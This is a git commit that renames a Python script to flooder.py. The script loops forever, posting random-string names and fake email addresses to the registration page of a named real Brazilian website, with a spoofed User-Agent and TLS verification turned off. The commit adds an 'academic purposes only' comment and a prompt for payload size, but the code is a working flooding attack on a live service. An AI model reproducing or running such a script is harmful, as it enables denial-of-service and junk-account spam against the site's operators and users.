67ac09f55b75da4eba984b47088ec1a02799433b
TheHoltz <38303017+TheHoltz@users.noreply.github.com>
2018-12-09 14:06:50 -0200

    Update and rename teste.py to flooder.py

--- flooder.py
+++ flooder.py
@@ -2,13 +2,16 @@ import requests
 from random import choice
 from string import ascii_lowercase
 
+#For academic purposes only
+
 url = 'https://www.minemarket.com.br/register/'
 requests.packages.urllib3.disable_warnings()
 
 lis=list(ascii_lowercase)
+nbytes = int(input("Tamanho de string por pacote: "))
 
 while(1):
-    ii = ''.join(choice(lis) for _ in range(1000))
+    ii = ''.join(choice(lis) for _ in range(nbytes))
     r = requests.post(url, headers={'User-Agent': 'Mozilla/5.0'}, allow_redirects=False, verify=False, data={
         'name': ii,
         'mail': ii+'@wh1t30wn4.c0m',
